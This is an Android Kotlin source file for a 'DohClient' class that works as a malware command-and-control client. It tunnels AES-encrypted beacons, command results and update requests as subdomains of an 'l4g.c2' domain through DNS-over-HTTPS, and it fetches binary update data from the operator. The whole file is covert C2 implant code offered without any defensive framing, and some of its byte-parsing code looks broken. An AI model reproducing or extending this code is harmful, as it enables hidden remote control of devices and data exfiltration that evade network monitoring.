package com.l4g.remote

import android.util.Base64
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.net.URL
import java.net.HttpURLConnection
import java.nio.charset.StandardCharsets
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread

class DohClient(private val endpoint: String = "https://1.1.1.1/dns-query") {
    companion object {
        private const val TAG = "DohClient"
        private const val ALGORITHM = "AES/GCM/NoPadding"
        private const val KEY_SIZE = 256
        private const val IV_SIZE = 12
        private const val TAG_SIZE = 16
        private const val CHUNK_SIZE = 50 // bytes per DNS label
    }
    
    private var sessionKey: ByteArray? = null
    private var agentId: String? = null
    
    suspend fun initialize(agentId: String, masterKey: String): Boolean {
        this.agentId = agentId
        // Derive session key from agent ID + master key
        sessionKey = deriveSessionKey(agentId, masterKey)
        return sessionKey != null
    }
    
    private fun deriveSessionKey(agentId: String, masterKey: String): ByteArray? {
        try {
            val combined = "$agentId$masterKey".toByteArray(StandardCharsets.UTF_8)
            val digest = java.security.MessageDigest.getInstance("SHA-256").digest(combined)
            return digest.copyOf(KEY_SIZE / 8)
        } catch (e: Exception) {
            Log.e(TAG, "Key derivation failed", e)
            return null
        }
    }
    
    suspend fun sendBeacon(status: Map<String, Any>): Result<Map<String, Any>> = withContext(Dispatchers.IO) {
        try {
            val payload = encryptPayload(status)
            val subdomain = "$agentId.beacon.${base64UrlEncode(payload)}.l4g.c2"
            val response = dohQuery(subdomain, "TXT")
            
            if (response.isSuccess) {
                val decrypted = decryptResponse(response.getOrThrow())
                val json = String(decrypted, StandardCharsets.UTF_8)
                Result.success(parseJson(json))
            } else {
                Result.failure(response.exceptionOrNull() ?: Exception("Beacon failed"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun sendCommandResult(sequence: Long, success: Boolean, error: String?): Result<Unit> = withContext(Dispatchers.IO) {
        try {
            val result = mapOf(
                "seq" to sequence,
                "ok" to success,
                "err" to error ?: ""
            )
            val payload = encryptPayload(result)
            val subdomain = "$agentId.result.$sequence.${base64UrlEncode(payload)}.l4g.c2"
            val response = dohQuery(subdomain, "TXT")
            
            if (response.isSuccess) {
                Result.success(Unit)
            } else {
                Result.failure(response.exceptionOrNull() ?: Exception("Send result failed"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun checkUpdate(currentVersion: Int): Result<UpdateInfo?> = withContext(Dispatchers.IO) {
        try {
            val payload = encryptPayload(mapOf("version" to currentVersion))
            val subdomain = "$agentId.update.${base64UrlEncode(payload)}.l4g.c2"
            val response = dohQuery(subdomain, "TXT")
            
            if (response.isSuccess) {
                val decrypted = decryptResponse(response.getOrThrow())
                val json = String(decrypted, StandardCharsets.UTF_8)
                val update = parseUpdateJson(json)
                Result.success(update)
            } else {
                Result.failure(response.exceptionOrNull() ?: Exception("Update check failed"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    private fun dohQuery(subdomain: String, recordType: String): Result<ByteArray> {
        return try {
            val dnsQuery = buildDnsQuery(subdomain, recordType)
            val url = URL("$endpoint?dns=$dnsQuery")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.setRequestProperty("Accept", "application/dns-message")
            conn.connectTimeout = 10000
            conn.readTimeout = 10000
            
            val inputStream = if (conn.responseCode >= 400) conn.errorStream else conn.inputStream
            val data = inputStream?.readAllBytes() ?: byteArrayOf()
            inputStream?.close()
            conn.disconnect()
            
            if (data.isEmpty()) {
                Result.failure(Exception("Empty DNS response"))
            } else {
                val parsed = parseDnsResponse(data)
                Result.success(parsed)
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    private fun buildDnsQuery(name: String, type: String): String {
        val query = java.io.ByteArrayOutputStream()
        
        // Header
        val id = (System.currentTimeMillis() & 0xFFFF).toShort()
        query.write(id.toByteArray())
        query.write(0x01.toByte()) // Standard query, recursion desired
        query.write(0x00.toByte())
        query.write(0x00.toByte()) // QDCOUNT = 1
        query.write(0x01.toByte())
        query.write(0x00.toByte()) // ANCOUNT = 0
        query.write(0x00.toByte())
        query.write(0x00.toByte()) // NSCOUNT = 0
        query.write(0x00.toByte())
        query.write(0x00.toByte()) // ARCOUNT = 0
        
        // Question - encode name
        for (label in name.split(".")) {
            query.write(label.length.toByte())
            query.write(label.toByteArray(StandardCharsets.UTF_8))
        }
        query.write(0x00) // Null terminator
        
        // QTYPE
        val qtype = if (type == "TXT") 16.toShort() else 1.toShort() // TXT=16, A=1
        query.write(qtype.toByteArray())
        
        // QCLASS
        val qclass = 1.toShort() // IN
        query.write(qclass.toByteArray())
        
        return base64UrlEncode(query.toByteArray())
    }
    
    private fun parseDnsResponse(response: ByteArray): ByteArray {
        if (response.size < 12) return byteArrayOf()
        
        var pos = 12
        
        // Skip question
        while (pos < response.size && response[pos] != 0) {
            pos += response[pos].toInt() + 1
        }
        pos++ // Null
        pos += 4 // QTYPE + QCLASS
        
        // Parse answers
        val ancount = response[6].toInt() shl 8 or response[7].toInt()
        for (i in 0 until ancount) {
            if (pos + 12 > response.size) break
            
            // Name (compressed pointer)
            if ((response[pos] and 0xC0) == 0xC0) pos += 2
            else {
                while (pos < response.size && response[pos] != 0) pos += response[pos].toInt() + 1
                pos++
            }
            
            if (pos + 10 > response.size) break
            val type = response[pos].toInt() shl 8 or response[pos + 1].toInt()
            val class_ = response[pos + 2].toInt() shl 8 or response[pos + 3].toInt()
            val rdlength = response[pos + 8].toInt() shl 8 or response[pos + 9].toInt()
            pos += 10
            
            if (type == 16 && class_ == 1) { // TXT record
                if (pos + rdlength <= response.size) {
                    return response.copyOfRange(pos, pos + rdlength)
                }
            }
            pos += rdlength
        }
        
        return byteArrayOf()
    }
    
    private fun encryptPayload(data: Map<String, Any>): ByteArray {
        val json = org.json.JSONObject(data).toString()
        val plaintext = json.toByteArray(StandardCharsets.UTF_8)
        
        val iv = ByteArray(IV_SIZE)
        java.security.SecureRandom().nextBytes(iv)
        
        val cipher = Cipher.getInstance(ALGORITHM)
        val keySpec = SecretKeySpec(sessionKey!!, "AES")
        val gcmSpec = GCMParameterSpec(TAG_SIZE * 8, iv)
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec)
        
        val ciphertext = cipher.doFinal(plaintext)
        
        // Combine: iv (12) + ciphertext
        val result = ByteArray(iv.size + ciphertext.size)
        System.arraycopy(iv, 0, result, 0, iv.size)
        System.arraycopy(ciphertext, 0, result, iv.size, ciphertext.size)
        
        return result
    }
    
    private fun decryptResponse(data: ByteArray): ByteArray {
        if (data.size < IV_SIZE + TAG_SIZE) throw Exception("Data too short")
        
        val iv = data.copyOfRange(0, IV_SIZE)
        val ciphertext = data.copyOfRange(IV_SIZE, data.size)
        
        val cipher = Cipher.getInstance(ALGORITHM)
        val keySpec = SecretKeySpec(sessionKey!!, "AES")
        val gcmSpec = GCMParameterSpec(TAG_SIZE * 8, iv)
        cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmSpec)
        
        return cipher.doFinal(ciphertext)
    }
    
    private fun base64UrlEncode(data: ByteArray): String {
        return Base64.encodeToString(data, Base64.NO_WRAP or Base64.URL_SAFE)
            .replace("=", "")
    }
    
    private fun parseJson(json: String): Map<String, Any> {
        val obj = org.json.JSONObject(json)
        val map = mutableMapOf<String, Any>()
        val keys = obj.keys()
        while (keys.hasNext()) {
            val key = keys.next()
            map[key] = obj.get(key)
        }
        return map
    }
    
    private fun parseUpdateJson(json: String): UpdateInfo? {
        val obj = org.json.JSONObject(json)
        if (!obj.getBoolean("update")) return null
        
        return UpdateInfo(
            version = obj.getInt("version"),
            changelog = obj.getString("changelog"),
            data = obj.getJSONArray("data").toIntArray().map { it.toByte() }.toByteArray()
        )
    }
    
    data class UpdateInfo(
        val version: Int,
        val changelog: String,
        val data: ByteArray
    )
}